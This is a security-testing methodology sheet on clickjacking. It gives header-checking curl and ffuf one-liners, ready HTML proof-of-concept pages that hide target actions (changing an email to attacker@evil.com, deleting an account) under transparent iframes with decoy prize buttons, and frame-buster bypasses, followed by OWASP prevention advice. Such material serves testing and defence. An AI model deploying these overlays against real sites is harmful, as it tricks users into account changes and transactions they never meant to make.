# Clickjacking (UI Redressing)

> Comprehensive methodology and one‑liner commands for testing clickjacking vulnerabilities, incorporating 2025–2026 trends (sandbox bypasses, multistep UI attacks, CSP + SameSite chaining, browser extension targets) and authoritative references (OWASP Clickjacking Defense Cheat Sheet, PortSwigger Web Security Academy, PayloadsAllTheThings).

Clickjacking tricks a user into clicking hidden or disguised elements (e.g., via transparent iframes) on a malicious page, causing unintended actions on the target site (like changing email, transferring funds, or granting permissions).

## Methodology

### Targets & Input Locations to Hunt

Test **every** page/frameable endpoint with sensitive/user‑intent actions:

- **Pages:** Sensitive actions (admin panels, account settings, payment/checkout/confirm buttons, password change, 2FA enrollment/disable, OAuth consent, delete account, like/follow/subscribe)
- Login / logout / session actions
- Form submissions (especially CSRF‑protected ones — clickjacking can bypass tokens if on‑domain)
- API‑driven UI actions (e.g., GraphQL mutations via frontend)
- Browser permission prompts (camera/mic/location if overlayable)
- Extension / popup interactions (DOM‑based extension clickjacking)

**Common vulnerable patterns:**

- Any page without `X‑Frame‑Options` or CSP `frame‑ancestors`
- Pages with actions triggered by simple clicks (no confirm / OTP)
- Authenticated actions relying only on cookies (combine with SameSite bypass checks)

### Basic Probes (Start Here)

Create a simple HTML POC to iframe the target:

```html
<html>
  <head>
    <title>Clickjack Test</title>
    <style>
      iframe { position:absolute; top:0; left:0; width:100%; height:100%; opacity:0.1; z-index:2; }
      button { position:absolute; top:150px; left:200px; z-index:1; font-size:50px; }
    </style>
  </head>
  <body>
    <button>Click here to win $1000!</button>
    <iframe src="https://target.com/change-email?new=attacker@evil.com"></iframe>
  </body>
</html>
```

- Open in browser → if target loads and overlays align → vulnerable
- Adjust opacity (0.00001–0.1), position, size to match real button/form
- Look for: page loads in iframe, clicks trigger actions (use dev tools to confirm)

## Tool Installation & Setup

### Burp Clickbandit

- Built‑into Burp Suite Professional
- Load target in Burp Browser → Click Clickbandit → perform actions → generates ready POC HTML

### OWASP Zap (Zed Attack Proxy)

- Includes automated clickjacking detection

### curl / ffuf (header checking)

```bash
# Install ffuf
go install github.com/ffuf/ffuf/v2@latest
```

### securityheaders.com (online checker)

- Use `https://securityheaders.com/?q=target.com` to check headers

## Testing Commands (One‑Liners)

### 1. Quick Detection via Headers

```bash
# Check for X‑Frame‑Options
curl -I "http://target.com/page" | grep -i "X-Frame-Options"
# Check for CSP frame‑ancestors
curl -I "http://target.com/page" | grep -i "content-security-policy"
# Combined grep
curl -sI "http://target.com/page" | grep -iE "X-Frame-Options|frame-ancestors"
```

### 2. Automated Frame Detection

```bash
# Scan multiple URLs for missing frame‑protection headers
for url in $(cat crawledurls.txt | head -50); do
    headers=$(curl -sI "$url" | grep -iE "X-Frame-Options|frame-ancestors")
    if [ -z "$headers" ]; then
        echo "VULN: $url"
    fi
done
```

### 3. Clickjacking PoC Generator

```bash
cat > clickjack-poc.html << 'EOF'
<!DOCTYPE html>
<html>
<head><title>Clickjacking PoC</title></head>
<body>
  <h1>Click the button below!</h1>
  <button style="padding: 20px;">Click Me</button>
  <iframe src="https://target.com/action" style="opacity:0; position:absolute; top:0; left:0; width:100%; height:100%;"></iframe>
</body>
</html>
EOF
```

### 4. Prefilled Inputs via GET Parameters

```bash
# Create POC with prefilled parameters
cat > prefilled-clickjack.html << 'EOF'
<iframe src="https://target.com/change-email?new=attacker@evil.com&submit=1" style="opacity:0; position:absolute; top:0; left:0; width:100%; height:100%;"></iframe>
<button style="position:absolute; top:150px; left:200px; font-size:30px;">Claim Your Prize!</button>
EOF
```

### 5. Sandbox Bypass POC

```bash
# Sandbox attribute disables JavaScript frame‑busters
cat > sandbox-bypass.html << 'EOF'
<iframe sandbox="allow-forms allow-scripts" src="https://target.com/admin/delete-account"></iframe>
EOF
```

### 6. Double / Nested Framing Bypass

```bash
# Nested iframes to break parent.location access
cat > double-frame.html << 'EOF'
<iframe src="data:text/html,<iframe src='https://target.com/sensitive'></iframe>"></iframe>
EOF
```

### 7. Automated Header Check with ffuf

```bash
# Mass check headers across subdomains
ffuf -u https://FUZZ.target.com -w /home/pwn/wordlists/subdomains.txt -H "User-Agent: Mozilla" -fr "X-Frame-Options: DENY" -o vulnerable.txt
```

## Advanced Techniques & Bypasses (2025–2026 Trends)

### Sandbox Attribute Tricks

- `<iframe sandbox="allow‑forms" src="...">` – blocks top.navigation, neuters frame‑busters
- `<iframe sandbox="allow‑forms allow‑scripts">` – allows forms and scripts but still restricts other behaviors

### Double / Nested Framing

- `iframe > iframe` breaks `parent.location` access (security violation)
- Use `data:` URIs or about:blank as intermediate frame

### Opacity / Pointer‑Events Tricks

- Low opacity (`opacity: 0.00001`) + `pointer‑events: none` on decoy
- CSS filters (`filter: opacity(0.1)`) for finer control

### Browser Quirks

- Rapid resize / focus race conditions
- SVG filters for pixel reading / logic
- Touch events on mobile devices (overlay taps)

### Extension Clickjacking

- Target browser extension popups / prompts that can be framed
- Use `chrome‑extension://` URLs (requires extension misconfiguration)

### No‑JS / Compatibility Mode

- Disable JavaScript in browser to evade frame‑busters
- Use `<noscript>` fallback techniques

### Multistep Clickjacking

- Sequence of iframes / timed clicks (add to cart → checkout → confirm)
- Use `setTimeout()` to switch iframe src between steps

### Combined with Other Vulnerabilities

- **Clickjacking + XSS** – iframe src with XSS payload to execute script in target origin
- **Clickjacking + CSRF** – if no SameSite=Strict, cookies sent cross‑site
- **Clickjacking + Open Redirect** – frame a redirect page to leak tokens

## Detection & Verification

**Header verification examples:**

- Good: `X‑Frame‑Options: DENY` + `Content‑Security‑Policy: frame‑ancestors 'none';`
- Weak: `X‑Frame‑Options: SAMEORIGIN` (allows subdomains/same‑site framing)
- Missing: No `X‑Frame‑Options` or CSP `frame‑ancestors`

**Indicators of Vulnerability:**

- Iframe loads successfully without being blocked
- Action triggers on decoy click (e.g., email changed, payment sent)
- Blind: use prefilled + observable side‑effect (e.g., profile pic change)

**Verification Steps:**

1. Check headers for missing/weak frame protection
2. Create a basic iframe POC and load in browser
3. Verify target page renders inside iframe
4. Align decoy element over sensitive button/form
5. Simulate click and observe if action is performed (use dev tools network tab)
6. For authenticated actions, ensure session cookies are sent (check SameSite attribute)

## Prevention Guidance (OWASP Latest)

1. **CSP frame‑ancestors (primary / modern standard)**
   - `Content‑Security‑Policy: frame‑ancestors 'none';` (block all)
   - `frame‑ancestors 'self';` (allow same‑origin)

2. **X‑Frame‑Options (fallback for legacy)**
   - `X‑Frame‑Options: DENY` or `SAMEORIGIN`

3. **SameSite=Strict or `Lax` on session cookies**
   - Prevents cookies from being sent in cross‑site iframes

4. **Avoid JavaScript frame‑busters** – unreliable (sandbox / double‑frame bypass)

5. **For frameable content: use `window.confirm()` to reveal origin**

6. **Defense‑in‑depth** – combine CSP + XFO + SameSite + UI confirmations

## References

- **PortSwigger Clickjacking** – [PortSwigger Web Security Academy](https://portswigger.net/web‑security/clickjacking)
- **OWASP Clickjacking Defense Cheat Sheet** – [OWASP Documentation](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html)
- **PayloadsAllTheThings – Clickjacking** – [GitHub Repository](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Clickjacking)
- **Recent Write‑ups (2025–2026)** – sandbox/multistep/extension clickjacking (PortSwigger labs, Medium/YesWeHack)
